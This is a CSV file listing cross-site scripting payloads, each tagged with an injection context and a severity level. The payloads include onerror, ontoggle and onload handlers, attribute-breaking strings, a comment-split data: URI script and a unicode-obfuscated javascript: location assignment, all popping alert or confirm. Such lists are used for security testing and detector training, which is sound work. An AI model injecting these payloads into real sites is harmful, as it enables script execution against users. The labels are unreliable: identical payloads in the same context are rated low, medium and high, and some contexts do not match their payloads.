payload,context,severity
\' onload=alert(1)//,attribute,high
\' onload=alert(1)//,event_handler,low
\' onload=alert(1)//,dom_sink,medium
\' onload=alert(1)//,attribute_escape,medium
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",template_injection,low
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",js_uri,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,medium
"""><img src=x onerror=alert(1)>",attribute,low
"""><img src=x onerror=alert(1)>",attribute,high
"""><img src=x onerror=alert(1)>",script_injection,high
"""><img src=x onerror=alert(1)>",attribute,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",tag_injection,high
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",template_injection,low
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,medium
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,dom_sink,low
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,js_uri,low
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,template_injection,medium
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,js_uri,medium
<details open ontoggle=alert(1)>,js_uri,medium
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,low
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,attribute_escape,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,high
<details open ontoggle=alert(1)>,event_handler,medium
<details open ontoggle=alert(1)>,event_handler,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
<image src/onerror=alert(1)>,html_body,medium
"ontouchstart=""alert(1)""",html_body,medium
<img/src=x onerror=confirm(1)//>,script_injection,low
<img/src=x onerror=confirm(1)//>,event_handler,medium
<img/src=x onerror=confirm(1)//>,event_handler,medium
<img/src=x onerror=confirm(1)//>,attribute,medium
<img/src=x onerror=confirm(1)//>,event_handler,medium
<img/src=x onerror=confirm(1)//>,attribute_escape,medium
<img/src=x onerror=confirm(1)//>,event_handler,medium
<img/src=x onerror=confirm(1)//>,event_handler,low
<img/src=x onerror=confirm(1)//>,script_injection,low
<img/src=x onerror=confirm(1)//>,dom_sink,high
"\""><img src=x onload=alert(1)>",attribute_escape,low
"\""><img src=x onload=alert(1)>",attribute_escape,low
"\""><img src=x onload=alert(1)>",attribute_escape,low
"\""><img src=x onload=alert(1)>",script_injection,medium
"\""><img src=x onload=alert(1)>",attribute_escape,medium
"\""><img src=x onload=alert(1)>",attribute_escape,high
"\""><img src=x onload=alert(1)>",attribute_escape,medium
"\""><img src=x onload=alert(1)>",attribute_escape,low
"\""><img src=x onload=alert(1)>",attribute_escape,high
<video src=x onerror=confirm(1)>,event_handler,low
<video src=x onerror=confirm(1)>,event_handler,high
<video src=x onerror=confirm(1)>,event_handler,low
"setTimeout(	""alert(	1)"",0)",dom_sink,low
